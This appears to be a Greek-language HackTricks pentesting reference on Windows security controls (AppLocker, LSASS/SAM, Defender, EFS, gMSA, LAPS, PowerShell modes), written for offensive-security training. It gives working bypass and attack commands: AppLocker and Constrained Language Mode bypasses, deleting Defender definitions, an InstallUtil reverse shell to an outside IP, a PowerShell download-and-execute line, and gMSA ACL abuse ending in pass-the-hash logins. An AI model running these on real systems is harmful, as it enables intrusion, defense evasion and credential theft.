# Έλεγχοι ασφάλειας Windows

{{#include ../../banners/hacktricks-training.md}}

## Πολιτική AppLocker

Μια λίστα επιτρεπόμενων εφαρμογών είναι μια λίστα εγκεκριμένων εφαρμογών λογισμικού ή εκτελέσιμων αρχείων που επιτρέπεται να υπάρχουν και να εκτελούνται σε ένα σύστημα. Στόχος είναι η προστασία του περιβάλλοντος από επιβλαβές malware και μη εγκεκριμένο λογισμικό που δεν ανταποκρίνεται στις συγκεκριμένες επιχειρηματικές ανάγκες ενός οργανισμού.

Το [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) είναι η **λύση της Microsoft για τη δημιουργία λιστών επιτρεπόμενων εφαρμογών** και δίνει στους διαχειριστές συστημάτων τον έλεγχο του **ποιες εφαρμογές και ποια αρχεία μπορούν να εκτελούν οι χρήστες**. Παρέχει **λεπτομερή έλεγχο** σε εκτελέσιμα αρχεία, scripts, αρχεία εγκατάστασης των Windows, DLLs, συσκευασμένες εφαρμογές και προγράμματα εγκατάστασης συσκευασμένων εφαρμογών.\
Είναι συνηθισμένο οι οργανισμοί να **μπλοκάρουν τα cmd.exe και PowerShell.exe** και την εγγραφή σε συγκεκριμένους καταλόγους, **αλλά όλα αυτά μπορούν να παρακαμφθούν**.

### Έλεγχος

Ελέγξτε ποια αρχεία/επεκτάσεις βρίσκονται στη λίστα αποκλεισμού ή στη λίστα επιτρεπόμενων:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

Αυτή η διαδρομή μητρώου περιέχει τις ρυθμίσεις και τις πολιτικές που εφαρμόζει το AppLocker, παρέχοντας έναν τρόπο να εξετάσετε το τρέχον σύνολο κανόνων που επιβάλλονται στο σύστημα:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Χρήσιμοι **φάκελοι με δικαιώματα εγγραφής** για παράκαμψη της πολιτικής AppLocker: Αν το AppLocker επιτρέπει την εκτέλεση οποιουδήποτε αρχείου μέσα στο `C:\Windows\System32` ή στο `C:\Windows`, υπάρχουν **φάκελοι με δικαιώματα εγγραφής** που μπορείτε να χρησιμοποιήσετε για να **παρακάμψετε αυτόν τον περιορισμό**.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- Τα συνήθως **έμπιστα** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries μπορούν επίσης να φανούν χρήσιμα για παράκαμψη του AppLocker.
- **Οι κακογραμμένοι κανόνες μπορούν επίσης να παρακαμφθούν**
  - Για παράδειγμα, με το **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, μπορείτε να δημιουργήσετε έναν **φάκελο με όνομα `allowed`** οπουδήποτε και θα επιτρέπεται.
  - Οι οργανισμοί συχνά εστιάζουν επίσης στον **αποκλεισμό του εκτελέσιμου αρχείου `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, αλλά ξεχνούν τις **άλλες** [**θέσεις των εκτελέσιμων αρχείων PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), όπως το `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ή το `PowerShell_ISE.exe`.
- Η επιβολή κανόνων για **DLL** ενεργοποιείται πολύ σπάνια, λόγω του πρόσθετου φόρτου που μπορεί να επιφέρει σε ένα σύστημα και των εκτεταμένων δοκιμών που απαιτούνται για να διασφαλιστεί ότι τίποτα δεν θα χαλάσει. Επομένως, η χρήση **DLL ως backdoors θα βοηθήσει στην παράκαμψη του AppLocker**.
- Μπορείτε να χρησιμοποιήσετε τα [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε** κώδικα Powershell σε οποιαδήποτε διεργασία και να παρακάμψετε το AppLocker. Για περισσότερες πληροφορίες, δείτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Αποθήκευση διαπιστευτηρίων

### Security Accounts Manager (SAM)

Τα τοπικά διαπιστευτήρια βρίσκονται σε αυτό το αρχείο· οι κωδικοί πρόσβασης είναι hashed.

### Local Security Authority (LSA) - LSASS

Τα **διαπιστευτήρια** (hashed) **αποθηκεύονται** στη **μνήμη** αυτού του υποσυστήματος για λόγους Single Sign-On.\
Το **LSA** διαχειρίζεται την τοπική **πολιτική ασφαλείας** (πολιτική κωδικών πρόσβασης, δικαιώματα χρηστών...), τον **έλεγχο ταυτότητας**, τα **access tokens**...\
Το LSA είναι αυτό που θα **ελέγξει** τα παρεχόμενα διαπιστευτήρια στο αρχείο **SAM** (για τοπική σύνδεση) και θα **επικοινωνήσει** με τον **domain controller** για να ελέγξει την ταυτότητα ενός χρήστη του domain.

Τα **διαπιστευτήρια** **αποθηκεύονται** μέσα στη **διεργασία LSASS**: εισιτήρια Kerberos, hashes NT και LM, κωδικοί πρόσβασης που αποκρυπτογραφούνται εύκολα.

### LSA secrets

Το LSA μπορεί να αποθηκεύσει ορισμένα διαπιστευτήρια στον δίσκο:

- Κωδικός πρόσβασης του λογαριασμού υπολογιστή του Active Directory (μη προσβάσιμος domain controller).
- Κωδικοί πρόσβασης λογαριασμών υπηρεσιών Windows
- Κωδικοί πρόσβασης για προγραμματισμένες εργασίες
- Άλλα (κωδικός πρόσβασης εφαρμογών IIS...)

### NTDS.dit

Είναι η βάση δεδομένων του Active Directory. Υπάρχει μόνο σε Domain Controllers.

## Defender

Το [**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) είναι ένα Antivirus που διατίθεται στα Windows 10 και Windows 11, καθώς και σε εκδόσεις του Windows Server. **Αποκλείει** κοινά εργαλεία pentesting, όπως το **`WinPEAS`**. Ωστόσο, υπάρχουν τρόποι να **παρακαμφθούν αυτές οι προστασίες**.

### Έλεγχος

Για να ελέγξετε την **κατάσταση** του **Defender**, μπορείτε να εκτελέσετε το PS cmdlet **`Get-MpComputerStatus`** (ελέγξτε την τιμή του **`RealTimeProtectionEnabled`** για να δείτε αν είναι ενεργό):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Για να κάνετε απαρίθμηση, μπορείτε επίσης να εκτελέσετε:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Encrypted File System (EFS)

Το EFS προστατεύει τα αρχεία μέσω κρυπτογράφησης, χρησιμοποιώντας ένα **συμμετρικό κλειδί** που ονομάζεται **File Encryption Key (FEK)**. Αυτό το κλειδί κρυπτογραφείται με το **δημόσιο κλειδί** του χρήστη και αποθηκεύεται μέσα στο **εναλλακτικό data stream** $EFS του κρυπτογραφημένου αρχείου. Όταν χρειάζεται αποκρυπτογράφηση, χρησιμοποιείται το αντίστοιχο **ιδιωτικό κλειδί** του ψηφιακού πιστοποιητικού του χρήστη για να αποκρυπτογραφηθεί το FEK από το stream $EFS. Περισσότερες λεπτομέρειες θα βρείτε [εδώ](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Σενάρια αποκρυπτογράφησης χωρίς παρέμβαση του χρήστη** περιλαμβάνουν:

- Όταν αρχεία ή φάκελοι μετακινούνται σε σύστημα αρχείων που δεν υποστηρίζει EFS, όπως το [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), αποκρυπτογραφούνται αυτόματα.
- Τα κρυπτογραφημένα αρχεία που αποστέλλονται μέσω δικτύου με το πρωτόκολλο SMB/CIFS αποκρυπτογραφούνται πριν από τη μετάδοση.

Αυτή η μέθοδος κρυπτογράφησης παρέχει **διαφανή πρόσβαση** του κατόχου στα κρυπτογραφημένα αρχεία. Ωστόσο, η απλή αλλαγή του κωδικού πρόσβασης του κατόχου και η σύνδεση δεν επιτρέπουν την αποκρυπτογράφηση.

**Βασικά σημεία**:

- Το EFS χρησιμοποιεί συμμετρικό FEK, κρυπτογραφημένο με το δημόσιο κλειδί του χρήστη.
- Η αποκρυπτογράφηση χρησιμοποιεί το ιδιωτικό κλειδί του χρήστη για την πρόσβαση στο FEK.
- Η αυτόματη αποκρυπτογράφηση πραγματοποιείται υπό συγκεκριμένες συνθήκες, όπως κατά την αντιγραφή σε FAT32 ή τη μετάδοση μέσω δικτύου.
- Ο κάτοχος έχει πρόσβαση στα κρυπτογραφημένα αρχεία χωρίς επιπλέον βήματα.

### Έλεγχος πληροφοριών EFS

Ελέγξτε αν ένας **χρήστης** έχει **χρησιμοποιήσει** αυτή την **υπηρεσία**, ελέγχοντας αν υπάρχει αυτή η διαδρομή:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Ελέγξτε **ποιος** έχει **πρόσβαση** στο αρχείο χρησιμοποιώντας cipher /c \<file>\
Μπορείτε επίσης να χρησιμοποιήσετε `cipher /e` και `cipher /d` μέσα σε έναν φάκελο για να **κρυπτογραφήσετε** και να **αποκρυπτογραφήσετε** όλα τα αρχεία

### Αποκρυπτογράφηση αρχείων EFS

#### Εκτέλεση ως Authority System

Αυτή η μέθοδος απαιτεί ο **χρήστης-θύμα** να **εκτελεί** μια **διεργασία** στον host. Αν ισχύει αυτό, χρησιμοποιώντας μια συνεδρία `meterpreter` μπορείτε να υποδυθείτε το token της διεργασίας του χρήστη (`impersonate_token` από το `incognito`). Εναλλακτικά, μπορείτε απλώς να κάνετε `migrate` στη διεργασία του χρήστη.

#### Γνωρίζοντας τον κωδικό πρόσβασης του χρήστη

Το Mimikatz τεκμηριώνει πώς να εισαγάγετε το υλικό πιστοποιητικού/ιδιωτικού κλειδιού του χρήστη και να αποκρυπτογραφήσετε αρχεία που προστατεύονται με EFS, όταν είναι γνωστός ο κωδικός πρόσβασης.<sup>[[6]](#references)</sup>

## Group Managed Service Accounts (gMSA)

Η Microsoft ανέπτυξε τα **Group Managed Service Accounts (gMSA)** για να απλοποιήσει τη διαχείριση των λογαριασμών υπηρεσιών στις υποδομές IT. Σε αντίθεση με τους παραδοσιακούς λογαριασμούς υπηρεσιών, στους οποίους συχνά είναι ενεργοποιημένη η ρύθμιση "**Password never expire**", τα gMSA προσφέρουν μια ασφαλέστερη και ευκολότερα διαχειρίσιμη λύση:

- **Αυτόματη διαχείριση κωδικών πρόσβασης**: Τα gMSA χρησιμοποιούν έναν σύνθετο κωδικό πρόσβασης 240 χαρακτήρων, ο οποίος αλλάζει αυτόματα σύμφωνα με την πολιτική του domain ή του υπολογιστή. Αυτή η διαδικασία εκτελείται από την Key Distribution Service (KDC) της Microsoft, εξαλείφοντας την ανάγκη για χειροκίνητη ενημέρωση των κωδικών πρόσβασης.
- **Ενισχυμένη ασφάλεια**: Αυτοί οι λογαριασμοί δεν επηρεάζονται από κλειδώματα λογαριασμών και δεν μπορούν να χρησιμοποιηθούν για διαδραστικές συνδέσεις, γεγονός που ενισχύει την ασφάλειά τους.
- **Υποστήριξη πολλών host**: Τα gMSA μπορούν να χρησιμοποιούνται από πολλούς host, γεγονός που τα καθιστά ιδανικά για υπηρεσίες που εκτελούνται σε πολλούς servers.
- **Δυνατότητα προγραμματισμένων εργασιών**: Σε αντίθεση με τους managed service accounts, τα gMSA υποστηρίζουν την εκτέλεση προγραμματισμένων εργασιών.
- **Απλοποιημένη διαχείριση SPN**: Το σύστημα ενημερώνει αυτόματα το Service Principal Name (SPN) όταν αλλάζουν τα στοιχεία sAMaccount ή το όνομα DNS του υπολογιστή, απλοποιώντας τη διαχείριση SPN.

Οι κωδικοί πρόσβασης των gMSA αποθηκεύονται στην ιδιότητα LDAP _**msDS-ManagedPassword**_ και επαναφέρονται αυτόματα κάθε 30 ημέρες από τους Domain Controllers (DCs). Αυτός ο κωδικός πρόσβασης, ένα κρυπτογραφημένο blob δεδομένων γνωστό ως [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), μπορεί να ανακτηθεί μόνο από εξουσιοδοτημένους διαχειριστές και τους servers στους οποίους είναι εγκατεστημένα τα gMSA, διασφαλίζοντας ένα ασφαλές περιβάλλον. Για πρόσβαση σε αυτές τις πληροφορίες, απαιτείται ασφαλής σύνδεση, όπως LDAPS, ή η σύνδεση πρέπει να έχει πιστοποιηθεί με 'Sealing & Secure'.

![Αναμετάδοση ελέγχου ταυτότητας NTLM για ανάκτηση κωδικού πρόσβασης gMSA](../../images/asd1.png)<sup>[[1]](#references)</sup>

Μπορείτε να διαβάσετε αυτόν τον κωδικό πρόσβασης με το [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup>

```
/GMSAPasswordReader --AccountName jkohler
```

[**Βρείτε περισσότερες πληροφορίες στην αρχειοθετημένη αρχική έρευνα**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/).<sup>[[1]](#references)</sup>

Η ίδια έρευνα εξηγεί πώς μια **NTLM relay attack** μπορεί να αποκτήσει έναν **κωδικό πρόσβασης gMSA**, όταν η principal που γίνεται relay έχει εξουσιοδότηση να διαβάσει το `msDS-ManagedPassword`.<sup>[[1]](#references)</sup>

### Κατάχρηση αλυσιδωτής σύνδεσης ACL για ανάγνωση του διαχειριζόμενου κωδικού πρόσβασης gMSA (GenericAll -> ReadGMSAPassword)

Σε πολλά περιβάλλοντα, χρήστες με χαμηλά προνόμια μπορούν να αποκτήσουν πρόσβαση σε gMSA secrets χωρίς παραβίαση του DC, εκμεταλλευόμενοι εσφαλμένα ρυθμισμένα ACL αντικειμένων:<sup>[[3]](#references)</sup>

- Σε μια ομάδα που μπορείς να ελέγξεις (π.χ. μέσω GenericAll/GenericWrite) έχει εκχωρηθεί `ReadGMSAPassword` σε ένα gMSA.
- Προσθέτοντας τον εαυτό σου σε αυτήν την ομάδα, αποκτάς το δικαίωμα να διαβάσεις το blob `msDS-ManagedPassword` του gMSA μέσω LDAP και να εξαγάγεις έγκυρα NTLM credentials.

Τυπική ροή εργασίας:

1) Εντόπισε τη διαδρομή με το BloodHound και σημείωσε τις principals από τις οποίες έχεις foothold ως Owned. Αναζήτησε edges όπως:
   - GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Πρόσθεσε τον εαυτό σου στην ενδιάμεση ομάδα που ελέγχεις (παράδειγμα με bloodyAD):

```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```

3) Διαβάστε τον κωδικό πρόσβασης gMSA μέσω LDAP και εξαγάγετε το NTLM hash. Το NetExec αυτοματοποιεί την εξαγωγή του `msDS-ManagedPassword` και τη μετατροπή του σε NTLM:

```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```

4) Κάντε authenticate ως gMSA χρησιμοποιώντας το NTLM hash (δεν απαιτείται plaintext). Αν ο λογαριασμός ανήκει στην ομάδα Remote Management Users, το WinRM θα λειτουργήσει απευθείας:

```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```

Σημειώσεις:
- Οι αναγνώσεις του `msDS-ManagedPassword` μέσω LDAP απαιτούν sealing (π.χ. LDAPS/sign+seal). Τα εργαλεία το χειρίζονται αυτόματα.
- Στα gMSA συχνά εκχωρούνται τοπικά δικαιώματα, όπως WinRM. Επαληθεύστε τη συμμετοχή σε ομάδες (π.χ. Remote Management Users) για να σχεδιάσετε lateral movement.
- Αν χρειάζεστε μόνο το blob για να υπολογίσετε μόνοι σας το NTLM, δείτε τη δομή MSDS-MANAGEDPASSWORD_BLOB.

Μια άλλη διαδρομή μέσω ACL είναι η εκχώρηση δικαιώματος εγγραφής στο ίδιο το αντικείμενο gMSA. Το `msDS-GroupMSAMembership` είναι ο security descriptor που χρησιμοποιείται για να καθοριστεί ποιοι principals μπορούν να ανακτήσουν τον διαχειριζόμενο κωδικό πρόσβασης. Το GUID του schema είναι `888eedd6-ce04-df40-b462-b8a50e41ba38`. Ένα ακριβές ACE `WriteProperty` σε αυτό το attribute για μια ομάδα που ελέγχετε μπορεί να αποτελέσει υποψήφια λύση για την αλλαγή της λίστας των αναγνωστών· αυτό διαφέρει από το να είστε ήδη καταχωρισμένοι ως αναγνώστης. Επιβεβαιώστε ολόκληρο το DACL, τα deny και inherited ACEs, καθώς και τα αποτελεσματικά δικαιώματα, πριν θεωρήσετε ότι η διαδρομή είναι αξιοποιήσιμη. Για μια νέα συμμετοχή σε ομάδα απαιτείται επίσης ανανέωση του token/session πριν επιχειρήσετε να διαβάσετε τον κωδικό πρόσβασης.<sup>[[7]](#references)</sup>



## LAPS

Το **Local Administrator Password Solution (LAPS)**, το οποίο είναι διαθέσιμο για λήψη από τη [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), επιτρέπει τη διαχείριση των κωδικών πρόσβασης του τοπικού Administrator. Αυτοί οι κωδικοί πρόσβασης, οι οποίοι είναι **τυχαίοι**, μοναδικοί και **αλλάζουν τακτικά**, αποθηκεύονται κεντρικά στο Active Directory. Η πρόσβαση σε αυτούς τους κωδικούς πρόσβασης περιορίζεται μέσω ACL σε εξουσιοδοτημένους χρήστες. Με επαρκή δικαιώματα, παρέχεται η δυνατότητα ανάγνωσης των κωδικών πρόσβασης τοπικού admin.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

Το PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **περιορίζει πολλές από τις δυνατότητες** που απαιτούνται για την αποτελεσματική χρήση του PowerShell, όπως τον αποκλεισμό αντικειμένων COM, την αποδοχή μόνο εγκεκριμένων τύπων .NET, workflows που βασίζονται σε XAML, κλάσεις PowerShell και άλλα.

### **Έλεγχος**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

```bash
#Easy bypass
Powershell -version 2
```

Σε τρέχουσες εκδόσεις των Windows, αυτό το bypass δεν λειτουργεί πλέον, αλλά μπορείτε να χρησιμοποιήσετε το [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Για να το μεταγλωττίσετε, ίσως χρειαστεί** **να** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> προσθέσετε το `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` και **να αλλάξετε το project σε .Net4.5**.

#### Άμεσο bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Μπορείτε να χρησιμοποιήσετε το [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή το [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε κώδικα Powershell** σε οποιαδήποτε διεργασία και να παρακάμψετε το constrained mode. Για περισσότερες πληροφορίες, δείτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Πολιτική εκτέλεσης PS

Από προεπιλογή, έχει οριστεί σε **restricted.** Οι βασικοί τρόποι παράκαμψης αυτής της πολιτικής:

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

Περισσότερα μπορείτε να βρείτε [εδώ](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Διεπαφή παρόχου υποστήριξης ασφαλείας (SSPI)

Είναι το API που μπορεί να χρησιμοποιηθεί για την αυθεντικοποίηση χρηστών.

Το SSPI επιλέγει ένα κατάλληλο πρωτόκολλο αυθεντικοποίησης για δύο μηχανήματα που επικοινωνούν, προτιμώντας το Kerberos όταν είναι διαθέσιμο. Αυτά τα πρωτόκολλα υλοποιούνται από παρόχους υποστήριξης ασφαλείας (SSP), οι οποίοι εγκαθίστανται ως DLL στα Windows· και οι δύο πλευρές πρέπει να υποστηρίζουν τον πάροχο που συμφωνήθηκε.

### Κύριοι SSP

- **Kerberos**: Ο προτιμώμενος
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** και **NTLMv2**: Για λόγους συμβατότητας
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: Για web servers και LDAP, με τον κωδικό πρόσβασης σε μορφή MD5 hash
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: Για SSL και TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Χρησιμοποιείται για τη διαπραγμάτευση του πρωτοκόλλου που θα χρησιμοποιηθεί (Kerberos ή NTLM, με προεπιλεγμένο το Kerberos)
  - %windir%\Windows\System32\lsasrv.dll

#### Η διαπραγμάτευση μπορεί να προσφέρει πολλές μεθόδους ή μόνο μία.

## UAC - Έλεγχος λογαριασμού χρήστη

Ο [Έλεγχος λογαριασμού χρήστη (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι μια λειτουργία που ενεργοποιεί **προτροπή συγκατάθεσης για δραστηριότητες με αυξημένα δικαιώματα**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Relaying για gMSA – cube0x0 (Internet Archive)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA μέσω αλυσιδωτής χρήσης δικαιωμάτων προς WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Παράκαμψη του AppLocker και του περιορισμένου λειτουργικού περιβάλλοντος PowerShell](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – 15 τρόποι παράκαμψης της πολιτικής εκτέλεσης του PowerShell](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ αποκρυπτογράφηση αρχείων EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [7] [Microsoft - ιδιότητα ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
{{#include ../../banners/hacktricks-training.md}}
